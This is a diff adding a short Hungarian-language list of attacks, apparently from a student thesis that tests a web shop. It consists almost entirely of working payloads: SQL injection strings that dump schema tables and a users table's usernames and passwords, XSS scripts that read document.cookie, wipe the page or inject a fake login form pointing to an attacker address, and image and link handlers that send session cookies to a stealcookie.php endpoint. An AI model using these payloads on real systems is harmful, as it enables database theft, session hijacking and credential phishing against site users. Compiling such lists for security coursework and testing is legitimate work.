@@ -1,0 +1,49 @@
+A támadások jegyzéke:
+
+****************************
+_____SQL befecskendezés_____
+
+
+
+%
+
+cipő%' AND 0 = SLEEP(2) -- 
+
+cipő%' UNION (SELECT TABLE_ID,NAME, N_COLS FROM information_schema.innodb_sys_tables) -- 
+
+cipő%' UNION (SELECT TABLE_ID,NAME,1 FROM information_schema.innodb_sys_columns WHERE TABLE_ID=40) -- 
+
+cipő%' UNION (SELECT userid, username, password FROM szdoga.users) -- 
+
+
+
+******************************
+_____Cross-Site Scripting_____
+
+<i>XSS próba</i>
+
+<script>alert('XSS próba')</script>
+
+<script> alert(document.cookie) </script>
+
+<form action=”támadó címe”>
+<h2>A vélemények megjelenítéséhez kérem jelentkezzen be!</h2>
+<label>Felhasználónév<input type="username" name="username"></label></br>
+<label>Jelszó<input type="password" name="password"></label></br>
+<br><input type="submit" value="Belépés"></br>
+</form>
+
+<script>(document.documentElement.innerHTML='')</script>
+
+
+
+************************************************
+_____Session Id elsajátítása HTML tag révén_____
+
+
+
+<img src=\'kep url cime\' onload=\"this.src=\'http://localhost:1234/szakdolgozat/stealcookie.php?c=\'+escape\(document.cookie\)\;\"/>
+
+<a href=# 
+onclick=\"document.location=
+\'http://localhost:1234/szakdolgozat/stealcookie.php?c=\'+escape\(document.cookie\)\;\">Én ezt a terméket rendeltem </a>
